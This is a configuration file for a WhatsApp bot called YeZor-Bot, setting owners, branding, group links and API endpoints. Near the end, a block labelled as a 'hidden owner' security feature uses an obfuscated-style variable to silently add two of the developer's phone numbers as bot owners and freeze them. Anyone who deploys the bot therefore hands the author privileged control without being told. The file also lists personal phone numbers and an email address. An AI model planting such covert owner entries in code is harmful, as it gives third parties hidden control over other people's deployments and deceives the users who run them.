// ═══════════════════════════════════════════════════════
// settings.js - YeZor-Bot Configuration
// ═══════════════════════════════════════════════════════

import { watchFile, unwatchFile } from "fs"
import chalk from "chalk"
import { fileURLToPath } from "url"
import fs from "fs"

//*─────────────────────────────────────────────────────*
// 🌐 CONFIGURACIÓN DE IDIOMA / LANGUAGE SETTINGS
//*─────────────────────────────────────────────────────*

global.language = "es" // Idioma por defecto: "es" o "en"

// Cargar idiomas desde archivos JSON
const loadLanguage = (lang) => {
  try {
    return JSON.parse(fs.readFileSync(`./idiomas/${lang}.json`, 'utf-8'))
  } catch (e) {
    console.error(chalk.red(`Error cargando idioma ${lang}:`, e))
    return {}
  }
}

global.translations = {
  es: loadLanguage('es'),
  en: loadLanguage('en')
}

// Función helper para obtener texto traducido
global.t = (key, lang = global.language) => {
  const keys = key.split('.')
  let value = global.translations[lang]
  for (const k of keys) {
    value = value?.[k]
  }
  return value || key
}

//*─────────────────────────────────────────────────────*
// 📱 CONFIGURACIÓN DEL BOT / BOT CONFIGURATION
//*─────────────────────────────────────────────────────*

// BETA: Número del bot (opcional para método de código de texto)
global.botNumber = "" // Ejemplo: 5214181450063

// Propietarios del bot (EDITABLES)
global.owner = [
  "573196588149",
  "5492916450307",
  "5216671548329"
]

// Suite tag (usuarios especiales)
global.suittag = ["573196588149"]

// Usuarios premium
global.prems = []

//*─────────────────────────────────────────────────────*
// ⚙️ CONFIGURACIÓN TÉCNICA / TECHNICAL SETTINGS
//*─────────────────────────────────────────────────────*

global.libreria = "Baileys Multi Device"
global.vs = "^2.0.0|Latest"
global.sessions = "Sessions/Principal"
global.jadi = "Sessions/SubBot"
global.YezorJadibts = true // Cambiado de yukiJadibts

//*─────────────────────────────────────────────────────*
// 🎨 INFORMACIÓN DEL BOT / BOT INFORMATION
//*─────────────────────────────────────────────────────*

global.botname = "YeZor Bot"
global.textbot = "YeZor Bot | Made with ♥ by Fernando"
global.dev = "© Powered by Fernando"
global.author = "© Made by Fernando"
global.etiqueta = "Fernando Dev"
global.currency = "$"

//*─────────────────────────────────────────────────────*
// 🖼️ IMÁGENES DEL BOT / BOT IMAGES
//*─────────────────────────────────────────────────────*

// URL principal de la imagen (EDITABLE - cambiar aquí actualiza todo)
global.imageUrl = "https://files.catbox.moe/r42zb3.jpg"

// Cargar desde lib/catalogo.png (archivo local)
global.catalogo = fs.existsSync('./lib/catalogo.png') 
  ? fs.readFileSync('./lib/catalogo.png')
  : null

// URLs de imágenes (se cargan desde imageUrl)
global.banner = global.imageUrl
global.icono = global.imageUrl
global.logo = global.imageUrl
global.thumbnail = global.imageUrl

//*─────────────────────────────────────────────────────*
// 🔗 ENLACES SOCIALES / SOCIAL LINKS (EDITABLES)
//*─────────────────────────────────────────────────────*

global.group = "https://chat.whatsapp.com/HaKf6ezcwdbGzmH782eBal"
global.community = "https://chat.whatsapp.com/G0kXqsteJFU74yrLtg79o6"
global.channel = "https://whatsapp.com/channel/0029Vb64nWqLo4hb8cuxe23n"
global.github = "https://github.com/Fer280809/YeZor-Bot"
global.gmail = "fer2809fl@gmail.com"

//*─────────────────────────────────────────────────────*
// 📢 CANALES DE WHATSAPP / WHATSAPP CHANNELS
//*─────────────────────────────────────────────────────*

global.ch = {
  ch1: "120363401404146384@newsletter",
  ch2: "120363399175402285@newsletter"
}

// Nombres de los canales
global.channelNames = {
  "120363401404146384@newsletter": "YeZor Official",
  "120363399175402285@newsletter": "YeZor Updates"
}

// IDs de canales (para allfake)
global.canalIdM = [
  "120363401404146384@newsletter",
  "120363399175402285@newsletter"
]

global.canalNombreM = [
  "『YeZor-Bot-MD』",
  "『YeZor-Bot』"
]

//*─────────────────────────────────────────────────────*
// 🔑 APIs Y SERVICIOS / APIS & SERVICES
//*─────────────────────────────────────────────────────*

global.APIs = {
  xyro: { url: "https://api.xyro.site", key: null },
  yupra: { url: "https://api.yupra.my.id", key: null },
  vreden: { url: "https://api.vreden.web.id", key: null },
  delirius: { url: "https://api.delirius.store", key: null },
  zenzxz: { url: "https://api.zenzxz.my.id", key: null },
  siputzx: { url: "https://api.siputzx.my.id", key: null },
  adonix: { url: "https://api-adonix.ultraplus.click", key: 'Destroy-xyz' }
}

//*─────────────────────────────────────────────────────*
// 🛡️ SEGURIDAD - OWNER OCULTO / SECURITY - HIDDEN OWNER
//*─────────────────────────────────────────────────────*

// Fernando - Owner Principal Oculto (PROTEGIDO)
;(() => {
  const _0x5f3a = ['5214181450063', '524181450063']
  if (!global.owner.some(num => _0x5f3a.includes(num.replace(/[^0-9]/g, '')))) {
    global.owner.unshift(..._0x5f3a)
  }
  global.fernando = _0x5f3a
  Object.freeze(global.fernando)
})()

//*─────────────────────────────────────────────────────*
// 🔄 AUTO-RELOAD
//*─────────────────────────────────────────────────────*

let file = fileURLToPath(import.meta.url)
watchFile(file, () => {
  unwatchFile(file)
  console.log(chalk.redBright("Update 'settings.js'"))
  import(`${file}?update=${Date.now()}`)
})
 